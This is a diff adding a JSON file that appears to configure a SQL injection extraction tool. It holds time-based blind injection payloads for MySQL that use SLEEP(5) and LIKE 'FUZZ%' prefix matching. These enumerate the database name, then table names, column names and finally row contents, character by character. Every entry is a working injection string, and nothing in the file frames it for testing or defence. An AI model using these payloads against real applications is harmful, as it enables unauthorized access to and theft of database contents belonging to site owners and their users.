@@ -1,0 +1,14 @@
+{
+    "db_name": [
+        "' OR IF((SELECT database() LIKE 'FUZZ%'), SLEEP(5), NULL) ;--"
+    ],
+    "table":[
+        "' OR IF((SELECT 1 FROM information_schema.tables WHERE table_schema = 'DB_NAME' and table_name LIKE 'FUZZ%'), SLEEP(5), NULL) ;--"
+    ],
+    "column":[
+        "' OR IF((SELECT 1 FROM information_schema.columns WHERE table_schema = 'DB_NAME' and table_name = 'TABLE_NAME' and column_name LIKE 'FUZZ%'), SLEEP(5), NULL) ;--"
+    ],
+    "row":[
+        "' OR IF((SELECT 1 FROM TABLE_NAME WHERE COLUMN_NAME LIKE 'FUZZ%'), SLEEP(5), NULL) ;--"
+    ]
+}
